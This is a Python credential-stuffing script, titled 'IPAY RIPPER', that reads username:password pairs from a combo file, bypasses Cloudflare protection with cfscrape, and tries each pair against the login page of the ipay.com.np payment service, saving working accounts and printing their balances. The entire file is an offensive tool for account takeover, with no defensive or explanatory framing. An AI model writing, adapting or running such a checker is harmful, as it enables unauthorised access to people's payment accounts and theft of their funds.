from bs4 import BeautifulSoup
import cfscrape
import os.path

print("""\n\n$$$$$$\ $$$$$$$\   $$$$$$\ $$\     $$\        $$$$$$$\  $$$$$$\ $$$$$$$\  $$$$$$$\  $$$$$$$$\ $$$$$$$\  
\_$$  _|$$  __$$\ $$  __$$\\$$\   $$  |      $$  __$$\ \_$$  _|$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ 
  $$ |  $$ |  $$ |$$ /  $$ |\$$\ $$  /       $$ |  $$ |  $$ |  $$ |  $$ |$$ |  $$ |$$ |      $$ |  $$ |
  $$ |  $$$$$$$  |$$$$$$$$ | \$$$$  /        $$$$$$$  |  $$ |  $$$$$$$  |$$$$$$$  |$$$$$\    $$$$$$$  |
  $$ |  $$  ____/ $$  __$$ |  \$$  /         $$  __$$<   $$ |  $$  ____/ $$  ____/ $$  __|   $$  __$$< 
  $$ |  $$ |      $$ |  $$ |   $$ |          $$ |  $$ |  $$ |  $$ |      $$ |      $$ |      $$ |  $$ |
$$$$$$\ $$ |      $$ |  $$ |   $$ |          $$ |  $$ |$$$$$$\ $$ |      $$ |      $$$$$$$$\ $$ |  $$ |
\______|\__|      \__|  \__|   \__|          \__|  \__|\______|\__|      \__|      \________|\__|  \__|
                                                                                                       
                                                                                                       
My Daddy\'s Discord : xsphere#5867 \n\n                                                                                                    """)
print("Initializing Checker...\n")
def checker():
    if os.path.isfile('combo.txt'):
        length = len(open("combo.txt").readlines())
        print ("Combo File Found \nLoaded "+str(length)+' accounts.\n')
        for x in range(0,length):
            with open("combo.txt","r") as f:
                for x in f.read().split('\n'):
                    account = x.split(':')
                    f.close()

                    sesseion = cfscrape.create_scraper()
                    sesseion.post('https://ipay.com.np/Account/LogOn',
                        data={'UserName': account[0],
                                'Password': account[1]})

                    membership = sesseion.get('https://ipay.com.np/User/MyProfile')
                    member_soup = BeautifulSoup(membership.text, 'html.parser')
                
                    if 'Welcome' in (member_soup.find('h4').text):
                        hs=open("working.txt",'w')
                        hs.write(str(account) +"\n")
                        hs.close()
                        print('TRUE  :  '+account[0]+':'+account[1]+" | Balance :"+(member_soup.find('span',{'class':'current-balance'}).text))
                    else:
                        print("FALSE : "+account[0]+':'+account[1]+" | Balance :"+' NULL')
                        
                exit()
                            #balance=member_soup.find('span',{'class':'current-balance'})


    else:
        print ("Combo File Not Found .Exiting the Tool")


checker()
